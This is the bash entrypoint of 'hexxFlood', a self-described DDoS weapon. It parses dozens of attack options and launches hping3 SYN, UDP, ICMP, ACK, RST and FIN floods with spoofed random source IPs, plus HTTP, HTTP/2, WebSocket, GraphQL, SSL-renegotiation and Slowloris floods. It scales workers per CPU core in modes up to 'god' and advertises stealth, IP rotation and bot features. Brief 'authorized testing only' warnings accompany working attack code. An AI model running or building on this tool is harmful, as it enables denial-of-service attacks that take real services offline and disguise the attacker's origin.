#!/bin/bash

# ============================================================
# hexxFlood - ULTIMATE DDOS WEAPON SYSTEM
# Version: 4.0 - GOD MODE (FULLY VERIFIED - ALL OPTIONS FIXED)
# Author: Cywarx
#
# This is the thin entrypoint. The engine lives in lib/:
#     lib/config.sh    defaults, state, colors, version
#     lib/utils.sh     counters, formatting, logging, URL, self-update
#     lib/system.sh    host tuning, GOD MODE, privilege elevation
#     lib/attacks.sh   the flood arsenal + worker scaling + modes
#     lib/dashboard.sh live dashboard, report, cleanup, monitor windows
#
# (The standalone external monitor is the separate monitor.sh at repo root.)
#
# ⚠️  USE ONLY on systems you OWN or are authorized to test.
# ============================================================

# ------------------------------------------------------------
# Resolve our own location and load the engine modules. Modules
# are sourced in dependency order: config (vars) first, then the
# function libraries. If any module is missing we abort loudly —
# the tool must ship with its lib/ directory intact.
# ------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" 2>/dev/null || cd "$(dirname "$0")" 2>/dev/null; pwd)"
LIB_DIR="$SCRIPT_DIR/lib"

for _mod in config utils system attacks dashboard; do
    if [ ! -f "$LIB_DIR/$_mod.sh" ]; then
        echo "FATAL: missing module $LIB_DIR/$_mod.sh" >&2
        echo "       hexxFlood must be run from a complete checkout (lib/ alongside hexxFlood.sh)." >&2
        exit 1
    fi
    # shellcheck source=/dev/null
    source "$LIB_DIR/$_mod.sh"
done
unset _mod

# ------------------------------------------------------------
# Runtime paths + optional user config (defined after config.sh
# so CONFIG_FILE / PLUGIN_DIR defaults exist to be overridden).
# ------------------------------------------------------------
MONITOR_SCRIPT="$SCRIPT_DIR/monitor.sh"
PLUGIN_DIR="${PLUGIN_DIR:-$HOME/.hexxflood/plugins}"

if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE" 2>/dev/null || true
fi

mkdir -p "$PLUGIN_DIR" 2>/dev/null

# ============================================================
# ARGUMENT PARSING
# ============================================================

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            # Target Options
            -t|--target) TARGET="$2"; TARGET_TYPE="ip"; shift 2 ;;
            -u|--url) URL="$2"; parse_url "$URL" || exit 1; shift 2 ;;
            --port) TARGET_PORT="$2"; shift 2 ;;
            
            # Attack Options
            -m|--mode) MODE="$2"; shift 2 ;;
            -T|--type) ATTACK_TYPES="$2"; shift 2 ;;
            -p|--threads) THREADS="$2"; shift 2 ;;
            -s|--size) PACKET_SIZE="$2"; SIZE_SET=1; shift 2 ;;
            -P|--ports) CUSTOM_PORTS="$2"; shift 2 ;;
            -D|--duration) ATTACK_DURATION="$2"; DURATION_SET=1; shift 2 ;;
            -i|--interface) INTERFACE="$2"; shift 2 ;;
            --no-spoof) SPOOF_IP=false; shift ;;
            --fixed-ports) RANDOM_PORTS=false; shift ;;
            
            # Protocol Options
            --http2) ENABLE_HTTP2=true; shift ;;
            --http3) ENABLE_HTTP3=true; shift ;;
            --websocket) ENABLE_WEBSOCKETS=true; shift ;;
            --sse) ENABLE_SSE=true; shift ;;
            --graphql) ENABLE_GRAPHQL=true; shift ;;
            --grpc) ENABLE_GRPC=true; shift ;;
            --webrtc) ENABLE_WEBRTC=true; shift ;;
            
            # Rate Limiting (FIXED)
            --rate-limit) ENABLE_RATE_LIMIT=true; RATE_LIMIT_PPS="$2"; shift 2 ;;
            --bandwidth) RATE_LIMIT_BPS="$2"; shift 2 ;;
            --throttle) THROTTLE_DELAY="$2"; shift 2 ;;
            
            # Payload Options
            --payload) CUSTOM_PAYLOAD="$2"; shift 2 ;;
            --payload-file) PAYLOAD_FILE="$2"; shift 2 ;;
            --payload-size) PAYLOAD_SIZE="$2"; shift 2 ;;
            --random-headers) RANDOMIZE_HEADERS=true; shift ;;
            --random-cookies) RANDOMIZE_COOKIES=true; shift ;;
            --session-tracking) ENABLE_SESSION_TRACKING=true; shift ;;
            --auth-bypass) ENABLE_AUTH_BYPASS=true; shift ;;
            
            # Traffic Distribution
            --multi-server) ENABLE_MULTI_SERVER=true; shift ;;
            --add-server) SERVER_LIST+=("$2"); shift 2 ;;
            --ip-rotation) ENABLE_IP_ROTATION=true; shift ;;
            --rotation-interval) IP_ROTATION_INTERVAL="$2"; shift 2 ;;
            --geolocation) ENABLE_GEOLOCATION=true; shift ;;
            --cdn-target) ENABLE_CDN_TARGETING=true; shift ;;
            
            # Stealth Options
            --timing-random) ENABLE_TIMING_RANDOMIZATION=true; shift ;;
            --fingerprint-spoof) ENABLE_FINGERPRINT_SPOOFING=true; shift ;;
            --ua-rotation) ENABLE_USERAGENT_ROTATION=true; shift ;;
            --referer-spoof) ENABLE_REFERER_SPOOFING=true; shift ;;
            
            # Scaling Options
            --dynamic-rate) ENABLE_DYNAMIC_RATE=true; shift ;;
            --base-rate) BASE_RATE="$2"; shift 2 ;;
            --max-rate) MAX_RATE="$2"; shift 2 ;;
            --burst-size) BURST_SIZE="$2"; shift 2 ;;
            --burst-interval) BURST_INTERVAL="$2"; shift 2 ;;
            --adaptive-throttle) ENABLE_ADAPTIVE_THROTTLING=true; shift ;;
            --priority-queue) ENABLE_PRIORITY_QUEUE=true; shift ;;
            
            # Performance Options
            --connection-pool) ENABLE_CONNECTION_POOLING=true; CONNECTION_POOL_SIZE="$2"; shift 2 ;;
            --async-workers) ENABLE_ASYNC_IO=true; ASYNC_WORKERS="$2"; shift 2 ;;
            --parallel-connections) ENABLE_PARALLEL_CONNECTIONS=true; PARALLEL_CONNECTIONS="$2"; shift 2 ;;
            --zero-copy) ENABLE_ZERO_COPY=true; shift ;;
            --memory-limit) MEMORY_LIMIT="$2"; shift 2 ;;
            --numa-aware) ENABLE_NUMA_AWARE=true; shift ;;
            --connection-recycling) ENABLE_CONNECTION_RECYCLING=true; shift ;;
            --bandwidth-optimization) ENABLE_BANDWIDTH_OPTIMIZATION=true; shift ;;
            
            # Resilience Options
            --auto-recovery) ENABLE_AUTO_RECOVERY=true; shift ;;
            --load-balancing) ENABLE_LOAD_BALANCING=true; shift ;;
            --round-robin) LOAD_BALANCE_ALGORITHM="round_robin"; shift ;;
            --self-healing) ENABLE_SELF_HEALING=true; shift ;;
            --failover) ENABLE_FAILOVER=true; shift ;;
            --backup-target) BACKUP_TARGETS+=("$2"); shift 2 ;;
            
            # Bot Network
            --bot-mode) BOT_MODE=true; shift ;;
            --bot-master) BOT_MASTER="$2"; shift 2 ;;
            --bot-token) BOT_TOKEN="$2"; shift 2 ;;
            --bot-id) BOT_ID="$2"; shift 2 ;;
            --register-bot) shift ;;
            --bot-capabilities) shift 2 ;;
            
            # Analytics Options
            --metrics) ENABLE_REALTIME_METRICS=true; shift ;;
            --metrics-interval) METRICS_INTERVAL="$2"; shift 2 ;;
            --anomaly-detection) ENABLE_ANOMALY_DETECTION=true; shift ;;
            --anomaly-threshold) ANOMALY_THRESHOLD="$2"; shift 2 ;;
            --pattern-recognition) ENABLE_PATTERN_RECOGNITION=true; shift ;;
            
            # Integration Options
            --api-port) ENABLE_API=true; API_PORT="$2"; shift 2 ;;
            --enable-plugins) ENABLE_PLUGINS=true; shift ;;
            --cloud-provider) 
                IFS=',' read -ra CLOUD_PROVIDERS <<< "$2"
                ENABLE_CLOUD_INTEGRATION=true
                shift 2
                ;;
            --siem-endpoint) SIEM_ENDPOINT="$2"; ENABLE_SIEM_INTEGRATION=true; shift 2 ;;
            --siem-key) SIEM_API_KEY="$2"; shift 2 ;;
            
            # Logging Options
            --log-file) LOG_FILE="$2"; shift 2 ;;
            --report-file) REPORT_FILE="$2"; ENABLE_REPORTING=true; shift 2 ;;
            --no-logging) ENABLE_LOGGING=false; shift ;;
            --no-report) ENABLE_REPORTING=false; shift ;;
            
            # Performance Tuning
            --tune) SYS_TUNE=true; shift ;;
            --no-tune) SYS_TUNE=false; shift ;;
            --tx-queue) TX_QUEUE_LEN="$2"; shift 2 ;;
            --cap) WORKER_CAP="$2"; NO_CAP=false; shift 2 ;;
            --no-cap|--unlimited) NO_CAP=true; shift ;;
            
            # Monitoring
            --monitor) RUN_MONITOR_ONLY=true; shift ;;
            --monitor-mode) MONITOR_MODE="$2"; shift 2 ;;
            --auto-monitor)
                AUTO_MONITOR=true
                if [[ -n "$2" && "$2" != -* ]]; then MONITOR_WINDOWS="$2"; shift 2; else shift; fi
                ;;
            --no-monitor) AUTO_MONITOR=false; shift ;;
            
            # Other
            -U|--update) self_update ;;
            -V|--version) echo -e "${WHITE}hexxFlood v$VERSION${NC}"; exit 0 ;;
            -h|--help) show_help; exit 0 ;;
            *) echo -e "${RED}Unknown option: $1${NC}"; show_help; exit 1 ;;
        esac
    done
}

# ============================================================
# BANNER & HELP
# ============================================================

show_banner() {
    clear
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                       ║"
    echo "║   ██╗  ██╗███████╗██╗  ██╗██╗  ██╗███████╗██╗      ██████╗  ██████╗ ██████╗           ║"
    echo "║   ██║  ██║██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗          ║"
    echo "║   ███████║█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║          ║"
    echo "║   ██╔══██║██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║          ║"
    echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝          ║"
    echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝           ║"
    echo "║                                                                                       ║"
    echo "║                ☢️  ULTIMATE DDOS WEAPON SYSTEM v4.0  ☢️                              ║"
    echo "║                     FULLY VERIFIED - ALL OPTIONS FIXED                                 ║"
    echo "╠═══════════════════════════════════════════════════════════════════════════════════════╣"
    echo "║  📡 Protocols: HTTP/1.1 HTTP/2 HTTP/3 WebSockets SSE GraphQL gRPC WebRTC             ║"
    echo "║  ⚡ Attacks: SYN UDP ICMP ACK RST FIN DNS NTP SNMP LDAP Memcached Slowloris           ║"
    echo "║  🎯 Advanced: IP Rotation Geolocation CDN Targeting Session Tracking Auth Bypass      ║"
    echo "║  🛡️  Stealth: Fingerprint Spoofing User-Agent Rotation Timing Randomization           ║"
    echo "║  🤖 Bot Network: Bot Agents Self-Healing Failover Load Balancing                      ║"
    echo "║  📊 Analytics: Real-time Metrics Anomaly Detection Pattern Recognition                ║"
    echo "╠═══════════════════════════════════════════════════════════════════════════════════════╣"
    echo "║                             Author: CyWarX                                            ║"
    echo "║                     ⚠️  USE RESPONSIBLY - ETHICAL TESTING ONLY  ⚠️                    ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    local D="$CYAN═══════════════════════════════════════════════════════════════════════════════$NC"
    echo -e "$D"
    echo -e "${WHITE}📖 hexxFlood v${VERSION} — Ultimate Network Stress-Testing Tool${NC}"
    echo -e "$D"
    echo ""
    echo -e "${YELLOW}USAGE${NC}"
    echo "  sudo hexxFlood -t <TARGET_IP>  -m <MODE>        # Layer 3/4 flood (hping3)"
    echo "  sudo hexxFlood -u <TARGET_URL> -m <MODE>        # resolves URL + HTTP flood"
    echo "       hexxFlood -u <URL> -T http -p 100          # Layer-7 only, NO root needed"
    echo ""
    echo -e "${YELLOW}TARGET${NC}"
    echo "  -t, --target IP        Raw IP target (routers, IoT, any host on your lab net)"
    echo "  -u, --url URL          Website target; auto-resolves + picks port 80/443"
    echo "      --port N           Override target port"
    echo ""
    echo -e "${YELLOW}ATTACK SHAPING${NC}"
    echo "  -m, --mode MODE        Intensity preset (see MODES below)"
    echo "  -T, --type LIST        Attack types, comma-separated (see TYPES below)"
    echo "  -p, --threads N        Worker/HTTP-thread count (1-200)"
    echo "  -s, --size BYTES       Packet size 64-65495 (BIG=bandwidth, SMALL=max pps)"
    echo "  -P, --ports LIST       Destination ports, comma-separated (floods each)"
    echo "  -D, --duration SEC     Run SEC seconds then auto-stop (0 = forever)"
    echo "  -d, --delay HINT       Inter-packet delay hint (u1/u10/u100)"
    echo ""
    echo -e "${YELLOW}MODES${NC}  (worker count scales with CPU cores)"
    echo "  low          2× cores · syn/udp/icmp/http · no tuning · runs forever"
    echo "  medium       4× cores · +ack · no tuning"
    echo "  high         8× cores · all TCP/UDP/ICMP + http · system tuning ON"
    echo "  extreme     16× cores · all types + http2/ws/graphql · tuning · auto-stop 60s"
    echo "  apocalypse  32× cores · everything maxed · tuning · auto-stop 60s"
    echo "  god         64× cores · EVERYTHING + kernel limits · auto-stop 60s"
    echo "  custom       drive it yourself with -T / -P / -p / -s"
    echo ""
    echo -e "${YELLOW}TYPES${NC}  (for -T)"
    echo "  Raw (root):  syn  udp  icmp  ack  rst  fin           via hping3"
    echo "  Layer-7:     http  http2  websocket  graphql  ssl_reneg  slowloris"
    echo "  all          every raw + layer-7 vector at once"
    echo ""
    echo -e "${YELLOW}LAYER-7 PROTOCOLS${NC}  (also auto-enabled by extreme/apocalypse/god)"
    echo "  --http2                Enable HTTP/2 flood        (needs python 'h2')"
    echo "  --websocket            Enable WebSocket flood     (needs 'websocket-client')"
    echo "  --graphql              Enable GraphQL flood       (needs 'requests')"
    echo ""
    echo -e "${YELLOW}SOURCE / STEALTH${NC}"
    echo "  --no-spoof             Send from your REAL source IP (default: --rand-source)"
    echo "  --fixed-ports          Hammer one static dst port (default: increment)"
    echo ""
    echo -e "${YELLOW}WORKER SCALING${NC}"
    echo "  --cap N                Worker ceiling on ANY interface"
    echo "  --no-cap, --unlimited  Remove all caps incl. the Wi-Fi auto-cap (full power)"
    echo "  HEXXFLOOD_WORKERS=N    (env) force an EXACT worker count, never capped"
    echo "  (default: Wi-Fi auto-caps to ~4× cores — its real throughput sweet spot)"
    echo ""
    echo -e "${YELLOW}SYSTEM TUNING${NC}  (safe + auto-restored on exit)"
    echo "  --tune                 Force tuning ON (buffers/tx-queue/CPU governor)"
    echo "  --no-tune              Never touch system settings"
    echo "  --tx-queue N           NIC tx queue length while flooding (default 10000)"
    echo ""
    echo -e "${YELLOW}MONITORING${NC}"
    echo "  -i, --interface IFACE  NIC to flood from / read stats on (default wlan0)"
    echo "  --monitor              Open the live monitor ONLY (no attack)"
    echo "  --monitor-mode MODE    ping | network | system | full | log"
    echo "  --auto-monitor         Auto-open a monitor window when the attack starts"
    echo "  --no-monitor           Attack only, stay in the current terminal"
    echo ""
    echo -e "${YELLOW}PRIVILEGES${NC}"
    echo "  Raw floods + tuning need root. Launch with sudo, or the tool offers to"
    echo "  self-elevate. AUTO_ROOT=yes auto-elevates; AUTO_ROOT=no stays HTTP-only."
    echo ""
    echo -e "${YELLOW}UTILITY${NC}"
    echo "  -U, --update           Self-update (git pull in the install dir)"
    echo "  -V, --version          Print version"
    echo "  -h, --help             This help"
    echo ""
    echo -e "${YELLOW}EXAMPLES${NC}"
    echo "  # Classic SYN-flood demo on a lab host, 2 minutes"
    echo "  sudo hexxFlood -t 192.168.1.11 -T syn -m high -D 120"
    echo ""
    echo "  # Max packets/sec CPU-crusher on a wired NIC (small packets), 60s"
    echo "  sudo hexxFlood -t 192.168.1.11 -i eth0 -m apocalypse -s 120 --no-cap -D 60"
    echo ""
    echo "  # Layer-7 only, NO root, hammer a web app with 150 HTTP workers"
    echo "  hexxFlood -u http://192.168.1.11 -T http -p 150"
    echo ""
    echo "  # Multi-protocol Layer-7 burst"
    echo "  sudo hexxFlood -u http://192.168.1.11 -T http,http2,websocket,graphql -m extreme"
    echo ""
    echo "  # Fully manual: UDP+SYN on DNS+web ports, real source IP, 90s"
    echo "  sudo hexxFlood -t 192.168.1.11 -m custom -T syn,udp -P 80,53 --no-spoof -D 90"
    echo ""
    echo -e "${RED}⚠️  Use ONLY on systems you OWN or are authorized to test.${NC}"
    echo ""
}

# ============================================================
# MAIN
# ============================================================

main() {
    trap cleanup SIGINT SIGTERM
    SCRIPT_ARGS=("$@")
    
    show_banner
    parse_args "$@"

    # Standalone monitor
    if [ "$RUN_MONITOR_ONLY" = true ]; then
        if [ ! -f "$MONITOR_SCRIPT" ]; then
            echo -e "${RED}❌ monitor.sh not found${NC}"; exit 1
        fi
        trap - SIGINT SIGTERM
        exec bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$MONITOR_MODE"
    fi

    # Bot mode
    if [ "$BOT_MODE" = true ]; then
        echo -e "${CYAN}🤖 Bot mode requires additional setup${NC}"
        echo -e "${YELLOW}Use standard attack modes instead${NC}"
        exit 0
    fi

    [ -n "$MODE" ] && set_mode

    ensure_privileges "$@"

    # Validate inputs
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ]; then
        echo -e "${RED}❌ Threads must be a positive number${NC}"; exit 1
    fi
    if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65536 ]; then
        echo -e "${RED}❌ Packet size must be between 64 and 65536${NC}"; exit 1
    fi

    # Expand "all" shortcut
    if [ "$ATTACK_TYPES" = "all" ]; then
        ATTACK_TYPES="http,http2,websocket,graphql,ssl_reneg,slowloris,syn,udp,icmp,ack,rst,fin"
    fi

    compute_flood_workers

    # GOD MODE optimizations
    if [ "$MODE" = "god" ] && [ "$RUN_AS_ROOT" -eq 1 ]; then
        god_mode_optimization
    fi

    # Default values for undefined variables
    : ${SYS_TUNE:=false}
    : ${TX_QUEUE_LEN:=10000}
    : ${NO_CAP:=false}
    : ${ENABLE_REPORTING:=true}
    : ${REPORT_FILE:="/tmp/hexxflood_report.txt"}
    : ${LOG_FILE:="/tmp/hexxflood.log"}
    : ${AUTO_MONITOR:=false}
    : ${MONITOR_MODE:="full"}
    : ${URL:=""}
    : ${ENABLE_HTTP2:=false}
    : ${ENABLE_HTTP3:=false}
    : ${ENABLE_WEBSOCKETS:=false}
    : ${ENABLE_SSE:=false}
    : ${ENABLE_GRAPHQL:=false}
    : ${ENABLE_GRPC:=false}
    : ${ENABLE_WEBRTC:=false}
    : ${ENABLE_SESSION_TRACKING:=false}
    : ${ENABLE_AUTH_BYPASS:=false}
    : ${ENABLE_IP_ROTATION:=false}
    : ${ENABLE_GEOLOCATION:=false}
    : ${ENABLE_CDN_TARGETING:=false}
    : ${ENABLE_TIMING_RANDOMIZATION:=false}
    : ${ENABLE_FINGERPRINT_SPOOFING:=false}
    : ${ENABLE_USERAGENT_ROTATION:=false}
    : ${ENABLE_REFERER_SPOOFING:=false}
    : ${ENABLE_DYNAMIC_RATE:=false}
    : ${ENABLE_BURST_CONTROL:=false}
    : ${ENABLE_PRIORITY_QUEUE:=false}
    : ${ENABLE_ADAPTIVE_THROTTLING:=false}
    : ${ENABLE_CONNECTION_POOLING:=false}
    : ${ENABLE_ASYNC_IO:=false}
    : ${ENABLE_ZERO_COPY:=false}
    : ${ENABLE_MEMORY_EFFICIENT:=true}
    : ${ENABLE_NUMA_AWARE:=false}
    : ${ENABLE_CONNECTION_RECYCLING:=false}
    : ${ENABLE_BANDWIDTH_OPTIMIZATION:=false}
    : ${ENABLE_AUTO_RECOVERY:=false}
    : ${ENABLE_LOAD_BALANCING:=false}
    : ${ENABLE_SELF_HEALING:=false}
    : ${ENABLE_FAILOVER:=false}
    : ${ENABLE_BOT_NETWORK:=false}
    : ${ENABLE_REALTIME_METRICS:=false}
    : ${ENABLE_ANOMALY_DETECTION:=false}
    : ${ENABLE_PATTERN_RECOGNITION:=false}
    : ${ENABLE_API:=false}
    : ${ENABLE_PLUGINS:=false}
    : ${ENABLE_CLOUD_INTEGRATION:=false}
    : ${ENABLE_SIEM_INTEGRATION:=false}
    : ${ENABLE_RATE_LIMIT:=false}
    : ${RATE_LIMIT_PPS:=0}
    : ${RATE_LIMIT_BPS:=0}
    : ${THROTTLE_DELAY:=0}
    : ${BURST_SIZE:=5000}
    : ${BURST_INTERVAL:=10}
    : ${BASE_RATE:=1000}
    : ${MAX_RATE:=1000000}
    : ${CONNECTION_POOL_SIZE:=1000}
    : ${ASYNC_WORKERS:=100}
    : ${PARALLEL_CONNECTIONS:=500}
    : ${MEMORY_LIMIT:=2048}
    : ${CUSTOM_PAYLOAD:=""}
    : ${PAYLOAD_FILE:=""}
    : ${PAYLOAD_SIZE:=1024}

    echo -e "${YELLOW}Configuration:${NC}"
    echo "  Target: $TARGET"
    echo "  Target Type: ${TARGET_TYPE^^}"
    [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
    echo "  Mode: ${MODE:-custom}"
    echo "  Attack Types: ${ATTACK_TYPES:-all}"
    echo "  Threads: $THREADS"
    echo "  Packet Size: $PACKET_SIZE bytes"
    echo "  Workers: ${GREEN}${FLOOD_WORKERS}${NC} (${CORES} CPU cores)"
    echo "  Duration: ${ATTACK_DURATION:-Infinite}"
    echo "  System Tuning: $([ "$SYS_TUNE" = true ] && echo "ON" || echo "OFF")"
    echo "  Root: $([ "$RUN_AS_ROOT" = 1 ] && echo "YES" || echo "NO")"
    if [ "$ENABLE_RATE_LIMIT" = true ]; then
        echo "  Rate Limit: ${RATE_LIMIT_PPS} PPS"
        [ "$RATE_LIMIT_BPS" -gt 0 ] && echo "  Bandwidth Limit: ${RATE_LIMIT_BPS} bps"
        [ "$THROTTLE_DELAY" -gt 0 ] && echo "  Throttle Delay: ${THROTTLE_DELAY}ms"
    fi
    echo ""
    echo -e "${RED}⚠️  WARNING: Use only on systems you OWN or have permission to test!${NC}"
    echo ""

    ATTACK_START_TIME=$(date +%s)
    ATTACK_INITIAL_PACKETS=$(get_packet_count)

    DETACH="setsid"; command -v setsid >/dev/null 2>&1 || DETACH=""

    # Apply system tuning
    if [ "$SYS_TUNE" = true ] && [ "$RUN_AS_ROOT" = 1 ]; then
        apply_system_tuning
    fi

    # Auto-open monitor
    launch_monitors

    # Launch HTTP/Web attacks
    if [ "$TARGET_TYPE" = "url" ] || [[ "$ATTACK_TYPES" == *"http"* ]]; then
        echo -e "${GREEN}🌐 Starting HTTP/Web attacks on $URL${NC}"
        
        # Check for HTTP/2
        if [[ "$ATTACK_TYPES" == *"http2"* ]] && [ "$ENABLE_HTTP2" = true ]; then
            generate_http2_flood "$TARGET" "$TARGET_PORT" "$THREADS" "$ATTACK_DURATION"
        fi
        
        # Check for WebSocket
        if [[ "$ATTACK_TYPES" == *"websocket"* ]] && [ "$ENABLE_WEBSOCKETS" = true ]; then
            generate_websocket_flood "$TARGET" "$TARGET_PORT" "$THREADS" "$ATTACK_DURATION"
        fi
        
        # Check for GraphQL
        if [[ "$ATTACK_TYPES" == *"graphql"* ]] && [ "$ENABLE_GRAPHQL" = true ]; then
            generate_graphql_flood "$TARGET" "$TARGET_PORT" "$THREADS" "$ATTACK_DURATION"
        fi
        
        # Check for SSL Renegotiation
        if [[ "$ATTACK_TYPES" == *"ssl_reneg"* ]]; then
            ssl_renegotiation_attack "$TARGET" "$TARGET_PORT" "$THREADS"
        fi
        
        # Check for Slowloris
        if [[ "$ATTACK_TYPES" == *"slowloris"* ]]; then
            slowloris_attack "$TARGET" "$TARGET_PORT" "$THREADS"
        fi
        
        # Standard HTTP flood (always run if http is in types)
        if [[ "$ATTACK_TYPES" == *"http"* ]] && [[ "$ATTACK_TYPES" != *"http2"* ]]; then
            http_flood "$URL" "$THREADS" "$ATTACK_DURATION"
        fi
        
        echo -e "${GREEN}✅ Web attacks started${NC}"
        echo ""
    fi

    # Launch raw packet floods (needs root)
    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),' && [ "${RUN_AS_ROOT:-0}" = 1 ]; then
        echo -e "${GREEN}🔥 Starting network layer attack on $TARGET...${NC}"
        echo -e "${GREEN}⚡ ${FLOOD_WORKERS} flood workers${NC}"
        echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
        echo ""

        SPOOF_FLAG=""
        [ "$SPOOF_IP" = true ] && SPOOF_FLAG="--rand-source"

        if [ -n "$CUSTOM_PORTS" ]; then
            TCP_PORTS=$(echo "$CUSTOM_PORTS" | tr ',' ' ')
            UDP_PORTS="$TCP_PORTS"
        else
            TCP_PORTS="80"
            UDP_PORTS="53"
        fi

        PP=""
        [ "$RANDOM_PORTS" = true ] && PP="++"

        local -a specs=()
        local type p
        for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
            case $type in
                icmp)            specs+=("icmp:") ;;
                syn|ack|rst|fin) for p in $TCP_PORTS; do specs+=("$type:$p"); done ;;
                udp)             for p in $UDP_PORTS; do specs+=("udp:$p"); done ;;
            esac
        done
        
        local nspec=${#specs[@]}; [ "$nspec" -eq 0 ] && nspec=1
        [ "$FLOOD_WORKERS" -lt "$nspec" ] && FLOOD_WORKERS=$nspec

        # Spawn workers
        local w spec
        for (( w = 0; w < FLOOD_WORKERS; w++ )); do
            spec=${specs[$(( w % nspec ))]}
            launch_flood "${spec%%:*}" "${spec#*:}"
        done

        # Sampler for statistics
        HPING_LOG="/tmp/hexxflood_hping.log"
        : > "$HPING_LOG" 2>/dev/null
        local s_type="${specs[0]%%:*}" s_port="${specs[0]#*:}"
        case "$s_type" in
            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            icmp) sudo hping3 -1 --flood $SPOOF_FLAG               -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
        esac
        HPING_SAMPLER_PID=$!
        log_attack "Started raw packet flood with $FLOOD_WORKERS workers"
        
    elif echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),' && [ "${RUN_AS_ROOT:-0}" != 1 ]; then
        echo -e "${YELLOW}⚠️  Skipping raw-packet floods - need root privileges${NC}"
        echo -e "${YELLOW}   Re-run with: sudo $0 $*${NC}"
        echo ""
    fi

    disown -a 2>/dev/null || true
    monitor_attack
}

# ============================================================
# START
# ============================================================

main "$@"
